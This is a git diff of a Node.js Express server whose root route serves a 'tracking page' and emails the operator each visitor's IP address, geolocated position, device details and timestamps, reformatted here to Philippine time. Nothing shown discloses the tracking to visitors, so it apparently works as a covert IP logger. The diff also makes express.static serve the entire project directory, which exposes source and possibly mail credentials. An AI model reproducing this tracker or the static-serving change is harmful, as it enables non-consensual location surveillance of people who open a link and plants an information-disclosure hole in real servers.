@@ -21,7 +21,7 @@ const transporter = nodemailer.createTransport({
 
 // Middleware
 app.use(express.urlencoded({ extended: true }));
-app.use(express.static(path.join(__dirname, 'public')));
+app.use(express.static(__dirname)); // Serve files from root directory
 
 // Session tracking middleware
 app.use((req, res, next) => {
@@ -37,28 +37,29 @@ app.use((req, res, next) => {
   next();
 });
 
-// Fixed timestamp formatting
+// Fixed timestamp formatting with Philippine timezone
 function formatTimestamp() {
-  const now = new Date();
-  
-  // Get timezone offset in hours
-  const timezoneOffset = -now.getTimezoneOffset() / 60;
-  const timezoneOffsetString = timezoneOffset >= 0 
-    ? `UTC+${timezoneOffset}` 
-    : `UTC${timezoneOffset}`;
-  
-  // Format local time string with timezone
-  const localTimeString = now.toLocaleString('en-US', {
-    timeZoneName: 'short',
-    hour12: false
-  });
+  const options = {
+    timeZone: 'Asia/Manila',
+    hour12: false,
+    year: 'numeric',
+    month: '2-digit',
+    day: '2-digit',
+    hour: '2-digit',
+    minute: '2-digit',
+    second: '2-digit'
+  };
 
+  const now = new Date();
+  const phTime = new Date(now.toLocaleString('en-US', { timeZone: 'Asia/Manila' }));
+  
   return {
     iso: now.toISOString(),
     utc: now.toUTCString(),
-    local: localTimeString,
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    timezoneOffset: timezoneOffsetString,
+    local: now.toLocaleString('en-US', options),
+    phTime: phTime.toLocaleString('en-US', options),
+    timezone: 'Asia/Manila (Philippine Time)',
+    timezoneOffset: 'UTC+8',
     unix: Math.floor(now.getTime() / 1000),
     precise: Number(process.hrtime.bigint() / 1000000n)
   };
@@ -194,13 +195,8 @@ app.get('/', async (req, res) => {
       console.error('Email failed:', error);
     });
 
-    // Serve the tracking page - ensure this is the last thing in the route
-    res.sendFile(path.join(__dirname, 'public', 'index.html'), (err) => {
-      if (err) {
-        console.error('Error sending file:', err);
-        res.status(500).send('Error loading page');
-      }
-    });
+    // Serve the index.html file directly from root
+    res.sendFile(__dirname + '/index.html');
 
   } catch (error) {
     console.error('Error processing request:', error);
@@ -217,11 +213,11 @@ function generateEmailText(timestamp, geoData, ip, timezone, deviceType, device,
   return `
 === 🌍 TIMING & LOCATION ===
 🕒 UTC Time:     ${timestamp.utc}
-🕒 Local Time:   ${timestamp.local} (${timestamp.timezoneOffset})
+🕒 PH Time:      ${timestamp.phTime} (${timestamp.timezone})
 🕒 ISO-8601:     ${timestamp.iso}
 🕒 Unix Time:    ${timestamp.unix}
 🕒 Precise:      ${timestamp.precise} ms
-🌐 Timezone:     ${timezone}
+🌐 Timezone:     ${timestamp.timezone}
 
 📍 IP Address:   ${ip}
 📍 Location:     ${geoData.combined}
@@ -272,11 +268,11 @@ function generateEmailHtml(timestamp, geoData, ip, timezone, deviceType, device,
   return `
 <b>=== 🌍 TIMING & LOCATION ===</b>
 🕒 <b>UTC Time:</b>     ${timestamp.utc}
-🕒 <b>Local Time:</b>   ${timestamp.local} (${timestamp.timezoneOffset})
+🕒 <b>PH Time:</b>      ${timestamp.phTime} <i>(${timestamp.timezone})</i>
 🕒 <b>ISO-8601:</b>     ${timestamp.iso}
 🕒 <b>Unix Time:</b>    ${timestamp.unix}
 🕒 <b>Precise:</b>      ${timestamp.precise} ms
-🌐 <b>Timezone:</b>     ${timezone}
+🌐 <b>Timezone:</b>     ${timestamp.timezone}
 
 📍 <b>IP Address:</b>   ${ip}
 📍 <b>Location:</b>     ${geoData.combined}
